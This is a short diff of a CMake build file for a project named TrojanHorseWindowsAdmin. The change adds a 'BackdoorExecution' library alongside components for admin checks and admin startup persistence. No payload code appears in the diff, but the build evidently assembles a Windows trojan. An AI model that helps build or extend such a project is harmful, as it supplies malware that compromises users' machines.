@@ -1,5 +1,5 @@
 add_executable(TrojanHorseWindowsAdmin main.cpp)
-target_link_libraries(TrojanHorseWindowsAdmin PUBLIC AdminCheck PathToCurrentExecutable AdminStartupItem CombaseLibrary)
+target_link_libraries(TrojanHorseWindowsAdmin PUBLIC BackdoorExecution AdminCheck PathToCurrentExecutable AdminStartupItem CombaseLibrary)
 
 if (CMAKE_SYSTEM_NAME STREQUAL "Windows")
     # Run executable as administrator
